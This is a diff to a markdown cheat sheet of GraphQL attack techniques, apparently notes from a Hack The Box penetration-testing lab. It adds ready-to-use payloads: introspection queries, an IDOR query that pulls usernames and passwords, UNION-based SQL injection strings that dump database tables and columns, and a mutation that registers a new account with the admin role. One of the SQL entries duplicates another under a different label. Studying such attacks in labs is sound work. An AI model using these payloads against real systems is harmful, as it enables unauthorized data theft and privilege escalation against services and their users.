@@ -34,6 +34,8 @@ Note: there is a automated tool called [graphw00f](https://github.com/dolevf/gra
 Once got the information:
 ```bash
 {__type(name: "UserObject") {name fields {name type {name kind}}}}
+
+{ __type(name: \"SecretObject\") { name fields { name type { name kind } } } }
 ```
 
 ## Get Information
@@ -44,5 +46,31 @@ query IntrospectionQuery { __schema { queryType { name } mutationType { name } s
 # IDOR
 ## Reconnaice
 ```bash
-{ __type(name: \"SecretObject\") { name fields { name type { name kind } } } }
+{ user(username: \"htb-stdnt\") { username password } }
+```
+# Injection Attacks
+## SQLI
+```bash
+# Table
+{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
+# Column
+{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") {username password role}}
+# Data
+{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
+```
+## XSS
+<img width="1548" height="421" alt="image" src="https://github.com/user-attachments/assets/2db00f0f-99af-4275-bccd-eb2c248083b2" />
+
+# Mutations
+- Reconnaice
+```bash
+query { __schema { mutationType { name fields { name args { name defaultValue type { ...TypeRef } } } } } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
+```
+
+```bash
+{ __type(name: \"RegisterUserInput\") { name inputFields { name description defaultValue } } }
+```
+
+```bash
+mutation{ registerUser(input: {username:\"user\", password: \"ee11cbb19052e40b07aac0ca060c23ee\", role:\"admin\", msg:\"chupapi\"}) {user {username password role msg}}}
 ```
